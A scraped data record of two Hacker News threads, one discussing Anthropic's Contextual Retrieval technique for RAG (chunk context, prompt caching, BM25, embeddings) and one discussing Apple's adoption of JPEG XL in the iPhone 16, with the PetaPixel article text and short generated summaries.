    "commentBody": "Contextual Retrieval (anthropic.com)213 points by loganfrederick 17 hours agohidepastfavorite58 comments postalcoder 11 hours agoTo add some context, this isn't that novel of an approach. A common approach to improve RAG results is to \"expand\" the underlying chunks using an llm, so as to increase the semantic surface area to match against. You can further improve your results by running query expansion using HyDE[1], though it's not always an improvement. I use it as a fallback. I'm not sure what Anthropic is introducing here. I looked at the cookbook code and it's just showing the process of producing said context, but there's no actual change to their API regarding \"contextual retrieval\". The one change is prompt caching, introduced a month back, which allows you to very cheaply add better context to individual chunks by providing the entire (long) document as context. Caching is an awesome feature to expose to developers and I don't want to take anything away from that. However, other than that, the only thing I see introduced is just a cookbook on how to do a particular rag workflow. As an aside, Cohere may be my favorite API to work with. (no affiliation) Their RAG API is a delight, and unlike anything else provided by other providers. I highly recommend it. 1: https://arxiv.org/abs/2212.10496 reply resiros 11 hours agoparentI think the innovation is using caching as so to make the cost of the approach manageable. The way they implemented it is that each time you create a chunk, you ask the llm to create an atomic chunk from the whole context. You need to do this for all tens of thousands of chunks in your data. This costs a lot. By caching the documents, you can spare costs reply skeptrune 10 hours agorootparentYou could also just save the first outputted atomic chunk and store it then re-use it each time yourself. Easier and more consistent. reply IanCal 7 hours agorootparentI don't understand how that helps here. They're not regenerating each chunk every time, this is about caching the state after running a large doc through a model. You can only do this kind of thing if you have access to the model itself, or it's provided by the API you use. reply postalcoder 10 hours agorootparentprevTo be fair, that only works if you keep chunk windows static. reply postalcoder 10 hours agorootparentprevYup. Caching is very nice.. but the framing is weird. \"Introducing\" to me, connotes a product release, not a new tutorial. reply bayesianbot 8 hours agoparentprevI was trying to do this using Prompt Caching like a month ago, but then noticed there's five minute maximum lifetime for the cached prompts - doesn't really work for my RAG needs (or probably most), where the queries would be ran during the next month or a year. I can't see any changes to that policy. Little surprised to see them talk about Prompt Caching relating to RAG. reply spott 4 hours agorootparentThey aren’t using the prompt caching on the query side, only on the embedding side… so you cache the document in the context window when ingesting it, but not during retrieval. reply KTibow 1 hour agorootparentIt seems a little odd to make multiple requests instead of using one request to create all the context for all the chunks. reply underlines 8 hours agoprevWe build a corporate RAG for a government entity. What I've learned so far by applying an experimental A/B testing approach to RAG using RAGAS metrics: - Hybrid Retrieval (semantic + vector) and then LLM based Reranking made no significant change using synthetic eva-questions - HyDE decreased answer quality and retrieval quality severly when measured with RAGAS using synthetic eval-questions (we still have to do a RAGAS eval using expert and real user questions) So yes, hybrid retrieval is always good - that's no news to anyone building production ready or enterprise RAG solutions. But one method doesn't always win. We found semantic search of Azure AI Search being sufficient as a second method, next to vector similarity. Others might find BM25 great, or a fine tuned query post processing SLM. Depends on the use case. Test, test, test. Next things we're going to try: - RAPTOR - SelfRAG - Agentic RAG - Query Refinement (expansion and sub-queries) - GraphRAG Learning so far: - Always use a baseline and an experiment to try to refute your null hypothesis using measures like RAGAS or others. - Use three types of evaluation questions/answers: 1. Expert written q&a, 2. Real user questions (from logs), 3. Synthetic q&a generated from your source documents reply williamcotton 6 hours agoparentCould you explain or link to explanations of all of the acronyms you’ve used in your comment? reply jiggawatts 5 hours agorootparentIt makes me chuckle a bit to see this kind of request in a tech forum, particularly when discussing advanced LLM-related topics. This is akin to a HN comment asking someone to search the Internet for something on their behalf, while discussing search engine algorithms! reply williamcotton 5 hours agorootparentIt adds useful context to the discussion and spurs further conversation. reply williamcotton 4 hours agorootparentHyDE: Hypothetical Document Embeddings [1] RAGAS: RAG Assessment [2] RAPTOR: Recursive Abstractive Processing for Tree-Organized Retrieval [3] Self-RAG: Self-Reflective Retrieval-Augmented Generation [4] Agentic RAG: Agentic Retrieval-Augmented Generation [5] GraphRAG: Graph Retrieval-Augmented Generation [6] [1] https://docs.haystack.deepset.ai/docs/hypothetical-document-... [2] https://docs.ragas.io/en/stable/ [3] https://arxiv.org/html/2401.18059v1 [4] https://selfrag.github.io [5] https://langchain-ai.github.io/langgraph/tutorials/rag/langg... [6] https://www.microsoft.com/en-us/research/blog/graphrag-unloc... reply simonw 12 hours agoprevMy favorite thing about this is the way it takes advantage of prompt caching. That's priced at around 1/10th of what the prompts would normally cost if they weren't cached, which means that tricks like this (running every single chunk against a full copy of the original document) become feasible where previously they wouldn't have financially made sense. I bet there are all sorts of other neat tricks like this which are opened up by caching cost savings. My notes on contextual retrieval: https://simonwillison.net/2024/Sep/20/introducing-contextual... and prompt caching: https://simonwillison.net/2024/Aug/14/prompt-caching-with-cl... reply thruway516 8 hours agoparentI follow your blog and read almost everything you write about Llms. Just curious (if you havent already written about it somewhere and I missed it), how much do you spend monthly, exploring all the various Llms and their features? (I think its a useful context for having a grasp of how much I would have to spend to keep up to date with the models out there and the latest features) reply simonw 6 hours agorootparentMost months I spend less than $10 total across the OpenAI, Anthropic and Google APIs - for the kind of stuff I do I’m just not racking up really high token counts. I spend $20/month on ChatGPT plus and $20/month on Claude Pro. I get GitHub Copilot for free as an open source maintainer. reply davedx 3 hours agoparentprevCost is one aspect, but what about ingest time? You’re adding significant processing time to your pipeline with this method right? reply simonw 1 hour agorootparentI expect most implementations of RAG don't mind this too much - if you're dealing with only a few hundred more pages of documents a day the ingestion time from using fancy tricks like this is going to be measured in minutes. reply jillesvangurp 11 hours agoparentprevYou could do a lot of stuff with pre-calculating things for your embeddings. Why cache when you can pre-calculate. That brings into play a whole lot of things people commonly do as part of ETL. I come from a traditional search back ground. It's quite obvious to me that RAG is a bit of a naive strategy if you limit it to just using vector search with some off the shelf embedding model. Vector search simply isn't that good. You need additional information retrieval strategies if you want to improve the context you provide to the LLM. That is effectively what they are doing here. Microsoft published an interesting paper on graph RAG some time ago where they combine RAG with vector search based on a conceptual graph that they construct from the indexed data using entity extraction. This allows them to pull in contextually relevant information for matching chunks. I have a hunch that you could probably get quite far without doing any vector search at all. It would be a lot cheaper too. Simply use a traditional search engine and some tuned query. The trick is of course query tuning. Which may not work that well for general purpose use cases but it could work for more specialized use cases. reply TmpstsTrrctta 10 hours agorootparentI have experience in traditional search as well and I think this is doing some limiting of my imagination when it comes to vector search. In the post, I did like the introduction of the Contextual BM25 compared to other hybrid approaches then doing rrf. For question answering, vector/semantic search is clearly a better fit in my mind, and I can see how the contextual models can enable and bolster that. However, because I’ve implemented and used so many keyword based systems, that just doesn’t seem to be how my brain works. An example I’m thinking of is finding a sushi restaurant near me with availability this weekend around dinner time. I’d love to be able to search for this as I’ve written it. How I would search for it would be search for sushi restaurant, sort by distance and hope the application does a proper job of surfacing time filtering. Conversely, this is mostly how I would build this system. Perhaps with a layer to determine user intention to pull out restaurant type, location sorting, and time filtering. I could see using semantic search for filtering down the restaurants to related to sushi, but do we then drop back into traditional search for filtering and sorting? Utilize function calling to have the LLM parameterize our search query? As stated, perhaps I’m not thinking of these the right way because of my experiences with existing systems, which I find seem to give me better results when well built reply ValentinA23 3 hours agorootparentAnother approach I saw is to build a conceptual graph using entity extraction and have the LLM suggest search paths through that graph to enhance the retrieval step. The LMM is fine-tuned on the conceptual graph for this specific task. Could work in your case, but you need to deal with an ontology that suits your use case, in other words it must already contain restaurant location, type of dishes served and opening hours. reply visarga 9 hours agorootparentprevGraphRAG requires you define upfront the schema of entity and relation types. This works when you are in a known domain, but in general, when you want to just answer questions from a large reference, you don't know what you need to put in the graph. reply lmeyerov 3 hours agorootparentprevThis was my exact question. Why do an LLM rewrite, when you can add a context vector to a chunk vector, and for plaintext indexing, add a context string (eg, tfidf)? The article claimed other context augmentation fails, and that you are better off paying anthropic to run an LLM on all your data, but it seems quite handwavy. What vector+text search nuance does a full document cache LLM rewrite catch that cheapo methods miss? Reminds me of \"It is difficult to get a man to understand something when his salary depends on his not understanding it\". (We process enough data that we try to limit LLMs to the retrieval step, and only embeddings & light LLMs to the indexing step, so it's a $$$ distinction for our customers.) The context caching is neat in general, so I have to wonder if this use case is more about paying for ease than quality, and its value for quality is elsewhere. reply postalcoder 10 hours agorootparentprevGraph RAG is very cool and outstanding at filling some niches. IIRC, Perplexity's actual search is just BM25 (based a lex fridman interview of the founder). reply jillesvangurp 10 hours agorootparentMakes sense; perplexity is really responsive and fast usually. I need to check out that interview with Lex Fridman. reply _hfqa 10 hours agorootparentprevDo you have the link and the time in the video where he mentions it? reply rty32 5 hours agorootparenthttps://youtu.be/e-gwvmhyU7A?t=2h5m41s reply ValentinA23 3 hours agoprevInteresting. One problem I'm facing is using RAG to retrieve applicable rules instead of knowledge (chunks): only rules that may apply to the context should be injected into the context. I haven't done any experiment, but one approach that I think could work would be to train small classifiers to determine whether a specific rule could apply. The main LLM would be tasked with determining whether the rule indeed applies or not for the current context. An example: let's suppose you're using an LLM to play a multi user dungeon. In the past your character has behaved badly with taxis so that the game has decided to create a rule that says that whenever you try to enter a taxi you're kicked out: \"we know who you are, we refuse to have you as a client until you formally apologize to the taxi company director\". Upon apologizing, the rule is removed. Note that the director of the taxi company could be another player and be the one who issued the rule in the first place, to be enforced by his NPC fleet of taxis. I'm wondering how well this could scale (with respect of number of active rules) and to which extent traditional RAG could be applied. It seems deciding whether a rule applies or not is a problem that is more abstract and difficult than deciding whether a chunk of knowledge is relevant or not. In particular the main problem I have identified that makes it more difficult is the following dependency loop that doesn't appear with knowledge retrieval: you need to retrieve a rule to identify whether it applies or not. Does anyone know how this problem could be solved ? reply skeptrune 12 hours agoprevI'm not a fan of this technique. I agree the scenario they lay out is a common problem, but the proposed solution feels odd. Vector embeddings have bag-of-words compression properties and can over-index on the first newline separated text block to the extent that certain indices in the resulting vector end up much closer to 0 than they otherwise would. With quantization, they can eventually become 0 and cause you to lose out on lots of precision with the dense vectors. IDF search overcomes this to some extent, but not enough. You can \"semantically boost\" embeddings such that they move closer to your document's title, summary, abstract, etc. and get the recall benefits of this \"context\" prepend without polluting the underlying vector. Implementation wise it's a weighted sum. During the augmentation step where you put things in the context window, you can always inject the summary chunk when the doc matches as well. Much cleaner solution imo. Description of \"semantic boost\" in the Trieve API[1]: >semantic_boost: Semantic boost is useful for moving the embedding vector of the chunk in the direction of the distance phrase. I.e. you can push a chunk with a chunk_html of \"iphone\" 25% closer to the term \"flagship\" by using the distance phrase \"flagship\" and a distance factor of 0.25. Conceptually it's drawing a line (euclidean/L2 distance) between the vector for the innerText of the chunk_html and distance_phrase then moving the vector of the chunk_html distance_factorL2Distance closer to or away from the distance_phrase point along the line between the two points. [1]:https://docs.trieve.ai/api-reference/chunk/create-or-upsert-... reply torginus 9 hours agoparentSorry random question - do vector dbs work across models? I'd guess no, since embeddings are models specific afaik, but that means that a vector db would lock you into using a single LLM and even within that, a single version, like Claude-3.5 Sonnet, and you couldn't move to 3.5 Haiku, Opus etc., never mind ChatGPT or Llama without reindexing. reply passion__desire 27 minutes agorootparentEmbedding is a transformation which allows us to find semantically relevant chunks from a catalogue given a query. Through some nearness criteria, you would retrieve \"semantically relevant\" chunks which along with query would be fed to LLMs and ask them to synthesize the best answer. Vespa docs are very great if you are thinking of building in this space. Retrieval part is independent of synthesis, hence it has its separate leaderboard on huggingface. https://docs.vespa.ai/en/embedding.html https://huggingface.co/spaces/mteb/leaderboard reply rvnx 8 hours agorootparentprevIn short: no. The vector databases are here to store vectors and calculating distance between vectors. The embeddings model is the model that you pick to generate these vectors from a string or an image. You give \"bart simpson\" to an embeddings model and it becomes (43, -23, 2, 3, 4, 843, 34, 230, 324, 234, ...) You can imagine it like geometric points in space (well, it's a vector though), except that instead of being 2D, or 3D-space, they are typically in higher-number of dimensions (e.g: 768). When you want to find similar entries, you just generate a new vector \"homer simpson\" (64, -13, 2, 3, 4, 843, 34, 230, 324, 234, ...) and send it to the vector database and it will return you all the nearest neighbors (= the existing entries with the smallest distance). To generate these vectors, you can use any model that you want, however, you have to stay consistent. It means that once you are using one embedding model, you are \"forever\" stuck with it, as there is no practical way to project from one vector space to another. reply torginus 8 hours agorootparentthat sucks :(. I wonder if there are other approaches to this, like simple word lookup, with storing a few synonyms, and prompting the LLM to always use the proper technical terms when performing a lookup. reply kordlessagain 4 hours agorootparentBack of the book index or inverted indexes can be stored in a set store and give decent results that compare to vector lookups. The issue with them is you have to do an extraction inference to get the keywords. reply valstu 11 hours agoprevWe're doing something similar. We first chunk the documents based on h1,h2,h3 headings. Then we add headers in the beginning of the chunk as a context. As an imagenary example, instead of one chunk being: The usual dose for adults is one or two 200mg tablets or capsules 3 times a day. It is now something like: # Fever ## Treatment --- The usual dose for adults is one or two 200mg tablets or capsules 3 times a day. This seems to work pretty well, and doesn't require any LLMs when indexing documents. (Edited formatting) reply passion__desire 22 minutes agoparentI used to always wonder how do llms know whether a particular long article or audio transcript was written by say Alan Watts. Basically these kind of metadata annotation would be common while preparing training data for Llama models and so on. This could also be reason for the genesis for the argument that ChatGPT got slower in December. That \"date\" metadata would \"inform\" ChatGPT to be unhelpful. reply visarga 9 hours agoparentprevI am working on question answering based on long documents / bundles of documents, 100+ pages, and I took a similar approach. I first summarize each page, give it a title and extract a list of subsections. Then I put all the summaries together and I ask the model to provide a hierarchical index. It will organize the whole bundle into a tree. At querying time I combine the path in the tree as additional context. reply cabidaher 11 hours agoparentprevDid you experiment with different ways to format those included headers? Asking because I am doing something similar to that as well. reply valstu 10 hours agorootparentNope, not yet. We have sticked with markdownish syntax so far. reply will-burner 2 hours agoprevI wish they included the datasets they used for the evaluations. As far as I can tell, in appendix II they include some sample questions, answers, and golden chunks but they do not give the entire dataset or give an explicit information on exactly what the datasets are. Does anyone know if the datasets they used for the evaluation are publicly available or if they give more information on the datasets than what's in appendix II? There are standard publically available datasets for this type of evaluation, like MTEB (https://github.com/embeddings-benchmark/mteb). I wonder how this technique does on the MTEB dataset. reply paxys 4 hours agoprevWaiting for the day when the entire AI industry goes back full circle to TF-IDF. reply davedx 3 hours agoparentYeah it did make me chuckle. I’m guessing products like elasticsearch support all the classic text matching algos out of the box anyway? reply msp26 6 hours agoprev> If your knowledge base is smaller than 200,000 tokens (about 500 pages of material) I would prefer that anthropic just release their tokeniser so we don't have to make guesses. reply _bramses 10 hours agoprevThe technique I find most useful is to implement a “linked list” strategy where a chunk has multiple pointers to the entry it is referenced by. This task is done manually, but the diversity of the ways you can reference a particular node go up dramatically. Another way to look at it, comments. Imagine every comment under this post is a pointer back to the original post. Some will be close in distance, and others will be farther, due to the perception of the authors of the comments themselves. But if you assign each comment a “parent_id”, your access to the post multiplies. You can see an example of this technique here [1]. I don’t attempt to mind read what the end user will query for, I simply let them tell me, and then index that as a pointer. There are only a finite number of options to represent a given object. But some representations are very, very, very far from the semantic meaning of the core object. [1] - https://x.com/yourcommonbase/status/1833262865194557505 reply davedx 3 hours agoprevEven with prompt caching this adds a huge extra time to your vector database create/update, right? That may be okay for some use cases but I’m always wary of adding multiple LLM layers into these kinds of applications. It’s nice for the cloud LLM providers of course. I wonder how it would work if you generated the contexts yourself algorithmically. Depending on how well structured your docs are this could be quite trivial (eg for an html doc insert the title > h1 > h2 > chunk). reply justanotheratom 2 hours agoprevLooking forward to some guidance on \"chunking\": \"Chunk boundaries: Consider how you split your documents into chunks. The choice of chunk size, chunk boundary, and chunk overlap can affect retrieval performance1.\" reply mark_l_watson 6 hours agoprevI just took the time to read through all source code and docs. Nice ideas. I like to experiment with LLMs running on my local computer so I will probably convert this example to use the light weight Python library Rank-BM25 instead of Elastic Search, and a long context model running on Ollama. I wouldn’t have prompt caching though. This example is well written and documented, easy to understand. Well done. reply skybrian 14 hours agoprevThis sounds a lot like how we used to do research, by reading books and writing any interesting quotes on index cards, along with where they came from. I wonder if prompting for that would result in better chunks? It might make it easier to review if you wanted to do it manually. reply visarga 9 hours agoparentThe fundamental problem of both keyword and embedding based retrieval is that they only access surface level features. If your document contains 5+5 and you search \"where is the result 10\" you won't find the answer. That is why all texts need to be \"digested\" with LLM before indexing, to draw out implicit information and make it explicit. It's also what Anthropic proposes we do to improve RAG. \"study your data before indexing it\" reply skybrian 53 minutes agorootparentMakes sense. It seems after retrieval, both would be useful - both the exact quote and a summary of its context. reply regularfry 7 hours agoprevI've been wondering for a while if having ElasticSearch as just another function to call might be interesting. If the LLM can just generate queries it's an easy deployment. reply vendiddy 9 hours agoprevI don't know anything about AI but I've always wished I could just upload a bunch of documents/books and the AI would perform some basic keyword searches to figure out what is relevant, then auto include that in the prompt. reply average_r_user 9 hours agoparentIt would help if you tried Notebooklm by Google. It does this, you can upload a document/PDF whatever, and ask questions. The model replies to you giving also a reference to your material reply mark_l_watson 6 hours agorootparent+1 Google’s NotebookLM is amazing. In addition to the functionality you mention, I tried loading the PDF for my entire Practical AI Programming with Clojure book and had it generate an 8 minute podcast that was very nuanced - to be honest, it seriously blew my mind how well it works. Here is a link to the audio file it automatically generated https://markwatson.com/audio/AIClojureBook.wav NotebookLM is currently free to use and was so good I almost immediately started paying Google $20 a month to get access to their pro version of Gemini. I still think the Groq APIs for open weight models are the best value for the money, but the way OpenAI, Google, Anthropic, etc. are productizing LLMs is very impressive. reply timwaagh 11 hours agoprevI guess this does give some insights. Using a more space efficient language for your codebase will mean more functionality in the ais context window when working with Claude and code. reply thelastparadise 7 hours agoprev [–] Can someone explain simply how these benchmarks work? What exactly is a \"failure rate\" and how is it computed? reply quantadev 2 hours agoparent [–] They simply ask the AI a question about a large document (or set of docs). It either gets the answer right or wrong. They count the number of hits and misses. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Contextual Retrieval is introduced to improve the retrieval step in Retrieval-Augmented Generation (RAG) by using Contextual Embeddings and Contextual BM25, reducing failed retrievals by up to 67% when combined with reranking.",
      "This method enhances retrieval accuracy, leading to better performance in downstream tasks such as customer support and legal analysis, and can be deployed using the provided cookbook.",
      "Traditional RAG often loses context by splitting documents into smaller chunks; Contextual Retrieval addresses this by prepending chunk-specific explanatory context before embedding and creating the BM25 index."
    ],
    "commentSummary": [
      "Anthropic has introduced prompt caching to improve the cost-effectiveness of their Contextual Retrieval process, which is a method to enhance Retrieval-Augmented Generation (RAG) results by expanding chunks using a Large Language Model (LLM).",
      "Prompt caching allows developers to save costs by storing the state after running a large document through a model, rather than regenerating each chunk every time, making it a significant update for those working with RAG workflows.",
      "The post highlights that while the cookbook provides a guide for a specific RAG workflow, the real innovation lies in the cost-saving feature of prompt caching, which was introduced a month ago."
    ],
    "points": 213,
    "commentCount": 58,
    "retryCount": 0,
    "time": 1726797442
  },
  {
    "id": 41598170,
    "title": "Why Apple Uses JPEG XL in the iPhone 16 and What It Means for Your Photos",
    "originLink": "https://petapixel.com/2024/09/18/why-apple-uses-jpeg-xl-in-the-iphone-16-and-what-it-means-for-your-photos/",
    "originBody": "Why Apple Uses JPEG XL in the iPhone 16 and What it Means for Your Photos SEP 18, 2024 JEREMY GRAY The iPhone 16 family has arrived and includes many new features, some of which Apple has played very close to its vest. One such improvement is the inclusion of JPEG XL file types, which promise improved image quality compared to standard JPEG files while delivering relatively smaller file sizes. What Is JPEG XL? JPEG XL is a next-generation image encoding standard formally standardized in early 2022. Since then, JPEG XL (.jxl) has been adopted by numerous operating systems and applications, albeit with some notable holdouts. Apple and its various software iterations have supported JPEG XL for at least a year, including in Finder, Preview, Final Cut Pro, Pages, Photos, Mail, Safari, and more. Adobe has also supported the format for a while, including in Adobe Camera Raw and Lightroom Classic. Credit: jpegxl.info Despite JPEG XL supporting reversible JPEG transcoding and being superior to JPEG in terms of quality and efficiency, the format has yet to be widely adopted. Neither Chrome nor Firefox, two very popular web browsers, support the format natively, for example. Extensions are available to support JPEG XL files, but they’re not installed by default. The JPEG XL community website cites the format’s ability to reduce file size while delivering “unmatched quality-per-byte.” Compared to a standard JPEG, a JPEG XL file is up to 55% smaller while providing a cleaner image that is visually lossless. Gone are typical JPEG artifacts. Although it’s easy to appreciate the technical advantages of JPEG XL, it is also worth pointing out a substantial benefit of smaller file sizes: reduced environmental impact. As the world generates increasing amounts of data, it’s essential to consider ways to reduce data load. All that stuff lives somewhere, and wherever it is, it requires energy to operate. It’s also important to note that JPEG XL supports wide-gamut and high dynamic range images. “JPEG XL is specifically designed to handle the rich colors of high-precision, high-dynamic range images,” the creators explain. To get the full impact, view this webpage on a compatible browser, like Safari, using an HDR display.Credit: jpegxl.info The format supports up to 32 bits per channel, supports RGB and CMYK delivery, works with multiple frames, and is open source. .jxl files support RGB, YCgCo, and XYB color space. The RGB color space is familiar to most photographers, but XYB? That’s an odd one. This color space is built on the physiological processes by which people see. “XYB facilitates perceptually uniform quantization,” the JPEG XL community website explains. “JPEG XL uses a color space derived from LMS called XYB. Based on the lower spatial density of S cones, this is interpreted as a hybrid color theory where L and M oppose each other while S is handled trichromatically. As a result, less data is needed for storing blue signals without losing much quality. JPEG XL’s colorspace was derived from Guetzli’s butteraugli metric and is based on Google’s Pik project.” Photo by Chris Niccolls Overall, JPEG XL addresses many of JPEG’s shortcomings. The 30-year-old format is not very efficient, only offers eight-bit color depth, doesn’t support HDR, doesn’t do alpha transparency, doesn’t support animations, doesn’t support multiple layers, includes compression artifacts, and exhibits banding and visual noise. JPEG XL tackles these issues, and unlike WebP and AVIF formats, which each have some noteworthy benefits too, JPEG XL has been built from the ground up with still images in mind. Why JPEG XL? Why Now? As for why it is including JPEG XL in the iPhone 16 Pro, Apple tells PetaPixel that the format promises two primary benefits over standard JPEG format: improved image quality and better compression performance. If there’s a 32MB JPEG image, that same photo will be 24MB in lossless JPEG XL and, even more impressively, about five megabytes in perceptually lossless format. Apple has wrapped JPEG XL photos inside a DNG container, enabling ProRAW files to retain their flexibility while being significantly smaller — up to nearly five times smaller. So, what’s the catch? Apple admits that JPEG XL is not universally adopted or supported, at least not yet, so it is not the ideal choice for every person. Each user will need to evaluate their workflow and needs and determine if JPEG XL fits. JPEG XL’s benefits won’t mean much to someone who works with software or platforms that don’t support the file. As Apple explains on the new iPhone models, JPEG XL files are supported on iOS 17 and later and macOS 14 and later. However, as mentioned, these .jxl files are wrapped in a DNG container, so you can’t just fire off .jxl files from the iPhone 16 Pro. Credit: Apple As has been the case with some of Apple’s other early adoptions, like Thunderbolt, not everything always works in every case. One can just look at the rollout of the HEIC format in the photo space for evidence of how new formats don’t always take hold and receive fast, widespread support. Compared to JPEG XL, HEIC — an implementation of HEIF — is just not good. With JPEG XL, while the benefits of the format are obvious and numerous, there are apt to be growing pains. Apple has done its part to limit these issues by offering JPEG XL support across its platforms and utilizing DNG containers. The other side of the coin is that because Apple is adopting and supporting JPEG XL, other companies may follow suit. While Samsung added JPEG XL to its latest Galaxy smartphones earlier this year, that doesn’t carry the same weight as Apple bringing JPEG XL to its latest smartphones and supporting it across its entire ecosystem. That’s not to say that JPEG XL is a few short months away from being as ubiquitous as the standard JPEG image format. It will take time, and there’s no guarantee the format will ever be universally supported. JPEG XL addresses many of the problems of JPEG images, so hopefully, JPEG XL will receive widespread support. As Apple fully understands, JPEG XL is clearly the superior format for photographers. Credit: Chris Niccolls A Welcome Improvement With Some Practical Concerns For now, those who happily live inside Apple’s walled garden will benefit from JPEG XL. Even when wandering outside the Mac/iPhone/iPad ecosystem, using JPEG XL can be a painless experience. It’s easy enough to open and edit JPEG XL files in Adobe software, for example. Credit: Apple However, beyond that, support will come later or may not come at all. JPEG is old and outdated, but its age has come myriad support and compatibility. Fortunately, reverse transcoding between JPEG and JPEG XL is possible, but even that still requires development efforts. The point is that just because JPEG XL is obviously better than many competing formats, it doesn’t mean everyone will adopt it. Smaller file sizes with similar or even better image quality has significant environmental implications.Credit: jpegxl.info For iPhone photographers, the benefits far outweigh the potential downsides. There’s little doubt that JPEG XL is an excellent image format that offers the quality of heavyweight formats with a file size even smaller than that of JPEGs. What would typically be a 75-ish megabyte ProRAW Max file will be about 20MB in a lossy ProRAW format using JPEG XL compression. A lossless file is still under 50MB. Without compromising quality, those are significant storage savings. Features, Mobile, News, Technology apple, iphone, iphone16, iphone16pro, jpeg, jpegxl, mobilephotography PetaPixel articles may include affiliate links; if you buy something through such a link, PetaPixel may earn a commission. RELATED ARTICLES What is an HEIC File? Everything You Need to Know Updates to the Ubiquitous JPEG Promise to Save Energy, Improve Quality What is a JPEG? Everything You Need to Know Apple ProRAW vs JPEG Shootout: Worth The Bigger File Size? DISCUSSION Load Comments",
    "commentLink": "https://news.ycombinator.com/item?id=41598170",
    "commentBody": "Why Apple Uses JPEG XL in the iPhone 16 and What It Means for Your Photos (petapixel.com)192 points by alwillis 16 hours agohidepastfavorite132 comments nesk_ 12 hours agoThat’s good news. I’ve watched a really good video in the last weeks about JPEG XL advantages, if you want to learn a bit more: https://youtube.com/watch?v=FlWjf8asI4Y reply hajhatten 10 hours agoparentWas just about to see if someone mentioned this video. Really good explanation comparing JPEG XL vs AVIF. reply trompetenaccoun 9 hours agoparentprevThis may be a naive question but can't we have the features of JPEG XL combined with the compression algorithm of AVIF? Why does it have to be one or the other? Size clearly matters, especially for the majority of the world's population who do not have access to super fast internet and TBs of storage. It's definitely a luxury not having to care about file sizes. reply lonjil 7 hours agorootparentAVIF is worse than JXL both for high fidelity compression and for lossless compression, which is what Apple is using JXL for here. reply trompetenaccoun 7 hours agorootparent\"Worse\" in what sense? There are of course always trade-offs when compressing. In terms of size though even the reviewer from the above video - who says he much prefers JPEG XL - claims his AVIF compression lead to a very significant reduction in file size when testing his family photos. At a loss of detail that's negligible, or basically invisible for practical every-day purposes. This seems to track with other comparisons I've read as well. Some claim even larger size reductions, depending on the source files. The main issue with AVIF seems to be slow loading, which granted is a real problem for web use in places with slow connections (as is file size!). Like implied I'm not an expert, I'm just wondering why AVIF can't have faster loading with a preview function like JPEG has. Is there a technical reason? reply lonjil 5 hours agorootparent> \"Worse\" in what sense? Worse as in not compressing as well. As I said, at high fidelity or lossless. At lower quality levels, AVIF files are smaller and JXL files are bigger. At higher quality levels, JXL files are smaller and AVIF files are bigger. At lossless, AVIF is worse than PNG, while JXL is much better. > Like implied I'm not an expert, I'm just wondering why AVIF can't have faster loading with a preview function like JPEG has. JPEG is fast to load regardless of its progressive loading feature. So there are really two things at play, speed of decoding, and whether partially loaded files can give you a preview. The slow decoding of AVIF is inherent to the design of the format, but different encoding choices can lead to different decoding speed. IIRC, the lower the encoding quality, the faster the decoding can be. And as for progressive display, that simply wasn't considered when AV1 was designed. You can do something funny and store two AVIF frames, one low quality and maybe lower resolution, followed by the full image, but then you're storing two images just to get a preview. reply account42 8 hours agorootparentprevBecause there is no point, AVIF does not have inherently superior compression to JPEG XL. reply pif 8 hours agorootparentprevBuying Apple is a luxury in itself: don't expect them thinking about the non rich. reply b15h0p 14 hours agoprevTo increase adoption they should not have limited this to the latest iPhone models. Why on earth can a one year old iPhone 15’s CPU not handle encoding JXL? It can encode 4K video in real time, so this should be no problem at all, right? reply WhyNotHugo 9 hours agoparentThis is how they sell new phones. The grand majority of new features don't require the latest hardware, but artificially restricting it increases sales of new phones. None technical people can't usually tell the difference between hardware and software clearly enough to understand this nasty trick. reply illiac786 5 hours agorootparentTo be fair it’s less bad than what some other vendors are doing, which is stopping to provide updates. Not saying apple is an angel, they intentionally generate ewaste by withholding such features… reply account42 8 hours agoparentprevThe \"CPU\" (that is, the generic compute part) cannot encode 4K video in real time, that part is handle by codec-specific HW. reply lonjil 7 hours agorootparentThey aren't doing JXL encoding in hardware though. Zero chance that the new iPhone chip has hardware acceleration for JXL. Definitely just plain old CPU encoding. And we're not talking about video anyway, this is about ProRAW, a still image format. reply NinoScript 13 hours agoparentprevI’d guess hardware acceleration could have something to do with it reply JyrkiAlakuijala 13 hours agorootparentI don't know, but my guesswork is that the DNG/ProRAW/JXL support comes with compatibility challenges. Limiting the size of the launch to well-informed photography prosumers and professionals will help to iron out the compatibility challenges — rather than make all confused consumers face these challenges at once. I don't think that hardware support plays a role here. The fastest encoding modes of JPEG XL are ridiculously fast on software, and Apple's CPUs seem powerful enough. reply Nanopolygon 12 hours agorootparentIn lossy mode I think there is no difference between AVIF, HEIC or JXL. AVIF is even a little bit ahead. For lossless mode, JXL's fast modes (-e1 and -e2) are fast. But their compression ratio is terrible. The higher levels are not usable in a camera in terms of speed. Of course, my favorite and many people's favorite in this regard is HALIC (High Availability Lossless Image Compression). It is a speed/compression monster. The problem is that for now it is closed source and there is no Google or similar company behind it. reply lonjil 7 hours agorootparent> In lossy mode I think there is no difference between AVIF, HEIC or JXL. AVIF is even a little bit ahead. AVIF is definitely not ahead for the high quality levels you'd use in photography. AVIF is ahead at lower quality levels. > For lossless mode, JXL's fast modes (-e1 and -e2) are fast. But their compression ratio is terrible. JXL lossless e1 is still a lot better than the lossless compression people tend to use for photos these days. Like Apple has been using Lossless JPEG, which sucks. reply JyrkiAlakuijala 2 hours agorootparentAgreed. At camera quality jpeg xl is far ahead in quality. Apple's last announcement is about camera quality, close to lossless kind of lossy. In this domain jpeg xl does not have real competition. AVIF and HEIC don't even support more than 12 bits of dynamics, and become slow when quality is increased. reply cchi_co 10 hours agoparentprevIt does seem odd to restrict new features to the latest models, especially when older ones still have powerful capabilities. reply Asmod4n 8 hours agorootparentIt’s good in a corporate setting, you don’t want to suddenly have to deal with a new file format for which you won’t have an app installed on your company PCs to view them. reply the4anoni 13 hours agoparentprevThis, I just don't understand why it seems only latest iPhones got this. reply rob74 11 hours agorootparentI also don't know, but I suspect the fact that Apple not only develops the OS, but also sells the devices, might have something to do with it... reply 0points 10 hours agorootparentCrystal clear case of faked obsolescence, a major cause for environmental damage. Costing the planet our future sustainability in the name of greed. And all you have to say about it is a snark? reply appendix-rock 10 hours agorootparentWords mean things. Please use the right words. 1. As another commenter points out, your device works exactly as it did before. 2. Nobody on the face of the earth is making a decision about whether or not to buy a new phone based on JPEG-XL support. The fact that you’d even entertain that either means you’re in too much of a bubble or you’re so blinded by Apple hatred that you’re willing to believe any contrived thing that paints the company in a negative light. Stop it. reply JyrkiAlakuijala 2 hours agorootparentI will buy an iphone if it supports jpeg xl, and exactly because of that 